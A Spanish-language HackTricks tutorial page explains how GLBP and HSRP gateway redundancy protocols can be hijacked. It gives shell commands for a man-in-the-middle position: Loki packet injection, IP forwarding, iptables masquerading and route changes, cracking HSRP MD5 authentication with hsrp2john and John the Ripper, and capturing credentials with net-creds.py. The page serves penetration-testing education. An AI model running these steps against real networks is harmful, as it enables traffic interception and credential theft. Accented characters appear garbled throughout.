# Ataques GLBP & HSRP

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 춰Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n [**art칤culos oficiales de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


## Descripci칩n general del secuestro de FHRP

### Comprensi칩n de FHRP
El Protocolo de Redundancia de Primer Salto (FHRP) es un conjunto de protocolos que garantiza la resiliencia de la red al combinar m칰ltiples enrutadores f칤sicos en una 칰nica entidad virtual. Esto mejora la distribuci칩n de carga y la tolerancia a fallos. Cisco Systems introdujo dos protocolos FHRP destacados: GLBP y HSRP.

### Detalles del Protocolo GLBP
Desarrollado por Cisco, GLBP (Protocolo de Equilibrio de Carga de Puerta de Enlace) opera sobre la pila TCP/IP, utilizando UDP en el puerto 3222 para la comunicaci칩n. Los enrutadores dentro de un grupo GLBP env칤an paquetes "hello" cada 3 segundos. La ausencia de estos paquetes durante 10 segundos de un enrutador indica su fallo. Sin embargo, estos ajustes de temporizador son ajustables.

### Operaci칩n y Equilibrio de Carga de GLBP
GLBP permite compartir la carga entre m칰ltiples enrutadores utilizando una 칰nica IP virtual y varias direcciones MAC virtuales. Cada enrutador en el grupo participa en el reenv칤o de paquetes. GLBP difiere de HSRP/VRRP al ofrecer un verdadero equilibrio de carga, que incluye:

- **Dependiente del Host:** Garantiza que un host reciba la misma direcci칩n MAC AVF, preservando las configuraciones NAT.
- **Round-Robin:** El modo predeterminado donde las direcciones MAC AVF se distribuyen alternativamente.
- **Round-Robin basado en Peso:** Equilibra la carga en funci칩n de una m칠trica de "Peso" predefinida.

### Roles y Terminolog칤a del Dominio GLBP
- **AVG (Puerta de Enlace Virtual Activa):** El enrutador principal, distribuyendo direcciones MAC a otros enrutadores.
- **AVF (Reenviador Virtual Activo):** Un enrutador que maneja el tr치fico de red.
- **Prioridad GLBP:** Decide el AVG, con un valor predeterminado de 100 y un rango de 1 a 255.
- **Peso GLBP:** Indica el nivel de carga del enrutador, ajustable manualmente o a trav칠s del Seguimiento de Objetos.
- **Direcci칩n IP Virtual GLBP:** Act칰a como la puerta de enlace predeterminada para los dispositivos conectados.

Para la comunicaci칩n, GLBP utiliza la direcci칩n multicast reservada 224.0.0.102 y el puerto UDP 3222. Se env칤an paquetes "hello" cada 3 segundos, y los enrutadores se marcan como "muertos" si no se recibe un paquete en 10 segundos.

### Mecanismo de Ataque GLBP
Un atacante puede convertirse en el enrutador principal enviando un paquete GLBP con el valor de prioridad m치s alto (255). Esto puede llevar a ataques de DoS o MITM, permitiendo la interceptaci칩n o redirecci칩n del tr치fico.

### Ejecuci칩n de un Ataque GLBP con Loki
[Loki](https://github.com/raizo62/loki_on_kali) puede realizar un ataque GLBP inyectando un paquete con prioridad y peso establecidos en 255. Los pasos previos al ataque implican recopilar informaci칩n como la direcci칩n IP virtual, la presencia de autenticaci칩n y los valores de prioridad del enrutador utilizando herramientas como Wireshark.

Pasos del Ataque:
1. Cambiar a modo promiscuo y habilitar el reenv칤o de IP.
2. Identificar el enrutador objetivo y recuperar su IP.
3. Generar un ARP Gratuito.
4. Inyectar un paquete GLBP malicioso, suplantando al AVG.
5. Asignar una direcci칩n IP secundaria a la interfaz de red del atacante, reflejando la IP virtual de GLBP.
6. Implementar SNAT para una visibilidad completa del tr치fico.
7. Ajustar el enrutamiento para garantizar el acceso continuo a Internet a trav칠s del enrutador AVG original.

Siguiendo estos pasos, el atacante se posiciona como un "hombre en el medio", capaz de interceptar y analizar el tr치fico de red, incluidos datos no cifrados o sensibles.

Para fines de demostraci칩n, aqu칤 est치n los fragmentos de comando requeridos:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
### Explicaci칩n Pasiva del Secuestro de HSRP con Detalles de Comandos

#### Descripci칩n General de HSRP (Protocolo de Router Redundante/En Espera Activa)
HSRP es un protocolo propietario de Cisco dise침ado para la redundancia de la puerta de enlace de red. Permite la configuraci칩n de m칰ltiples routers f칤sicos en una 칰nica unidad l칩gica con una direcci칩n IP compartida. Esta unidad l칩gica es gestionada por un router primario responsable de dirigir el tr치fico. A diferencia de GLBP, que utiliza m칠tricas como prioridad y peso para el equilibrio de carga, HSRP se basa en un 칰nico router activo para la gesti칩n del tr치fico.

#### Roles y Terminolog칤a en HSRP
- **Router Activo de HSRP**: El dispositivo que act칰a como puerta de enlace, gestionando el flujo de tr치fico.
- **Router en Espera de HSRP**: Un router de respaldo, listo para tomar el control si el router activo falla.
- **Grupo de HSRP**: Un conjunto de routers que colaboran para formar un 칰nico router virtual resistente.
- **Direcci칩n MAC de HSRP**: Una direcci칩n MAC virtual asignada al router l칩gico en la configuraci칩n de HSRP.
- **Direcci칩n IP Virtual de HSRP**: La direcci칩n IP virtual del grupo de HSRP, actuando como la puerta de enlace predeterminada para los dispositivos conectados.

#### Versiones de HSRP
HSRP viene en dos versiones, HSRPv1 y HSRPv2, que difieren principalmente en capacidad de grupo, uso de IP multicast y estructura de direcci칩n MAC virtual. El protocolo utiliza direcciones IP multicast espec칤ficas para el intercambio de informaci칩n de servicio, con paquetes Hello enviados cada 3 segundos. Se presume que un router est치 inactivo si no se recibe ning칰n paquete dentro de un intervalo de 10 segundos.

#### Mecanismo de Ataque de HSRP
Los ataques de HSRP implican tomar el rol del Router Activo de forma forzada mediante la inyecci칩n de un valor de prioridad m치ximo. Esto puede llevar a un ataque de Hombre en el Medio (MITM). Los pasos esenciales previos al ataque incluyen recopilar datos sobre la configuraci칩n de HSRP, lo cual se puede hacer utilizando Wireshark para el an치lisis de tr치fico.

#### Pasos para Evadir la Autenticaci칩n de HSRP
1. Guardar el tr치fico de red que contiene datos de HSRP en un archivo .pcap.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Extraer los hashes MD5 del archivo .pcap utilizando hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Descifrar los hashes MD5 utilizando John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Ejecutando la Inyecci칩n de HSRP con Loki**

1. Iniciar Loki para identificar los anuncios de HSRP.
2. Configurar la interfaz de red en modo promiscuo y habilitar el reenv칤o de IP.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Utilizar Loki para apuntar al router espec칤fico, ingresar la contrase침a de HSRP descifrada y realizar las configuraciones necesarias para hacerse pasar por el Router Activo.
4. Despu칠s de obtener el rol de Router Activo, configurar la interfaz de red y las tablas IP para interceptar el tr치fico leg칤timo.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Modificar la tabla de enrutamiento para dirigir el tr치fico a trav칠s del antiguo Router Activo.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Utilizar net-creds.py o una utilidad similar para capturar credenciales del tr치fico interceptado.
```shell
sudo python2 net-creds.py -i eth0
```

Al ejecutar estos pasos, el atacante se coloca en una posici칩n para interceptar y manipular el tr치fico, similar al procedimiento para el secuestro de GLBP. Esto resalta la vulnerabilidad en protocolos de redundancia como HSRP y la necesidad de medidas de seguridad robustas.
